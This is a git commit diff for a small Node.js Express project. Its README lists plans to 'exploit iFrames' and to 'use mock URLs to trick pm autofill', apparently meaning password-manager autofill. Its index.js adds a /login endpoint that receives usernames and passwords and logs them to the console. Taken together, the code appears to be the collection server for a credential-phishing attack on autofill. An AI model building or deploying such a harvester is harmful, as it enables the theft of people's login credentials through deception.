b0e0d42aefa5f42c54e433a0583566258630fdd2
Novaenn <samuele.bella@hotmail.it>
2023-09-13 17:28:42 +0200

    Completed project

---
+++ README.md
@@ -0,0 +1,5 @@
+# TODO
+- Exploit iFrames
+- Use mock URLs to trick pm autofill
+    
+node index.js
--- index.js
+++ index.js
@@ -2,17 +2,33 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 
-const PORT = 3000; // You can change this port number if needed
+const PORT = 3000;
 
 app.use(bodyParser.urlencoded({ extended: false }));
 
-app.post('/password', (req, res) => {
-  const password = req.body.password;
-  console.log('Received password:', password);
-  // You can do further processing with the password here
+// app.post('/login', (req, res) => {
+//   const username = req.body.username;
+//   console.log('Received username:', username);
+//   // Respond with a success message
+//   res.status(200).send('Username received successfully.');
+// });
 
-  // Respond with a success message
-  res.status(200).send('Password received successfully.');
+// app.post('/login', (req, res) => {
+//   const password = req.body.password;
+//   console.log('Received password:', password);
+//   // Respond with a success message
+//   res.status(200).send('Password received successfully.');
+// });
+
+app.post('/login', (req, res) => {
+  const username = req.body.username;
+  const password = req.body.password;
+  if (!req.body.password) {
+    console.log('Received username:', username);
+  };
+  if (!req.body.username) {
+    console.log('Received password:', password);
+  };
 });
 
 app.listen(PORT, () => {
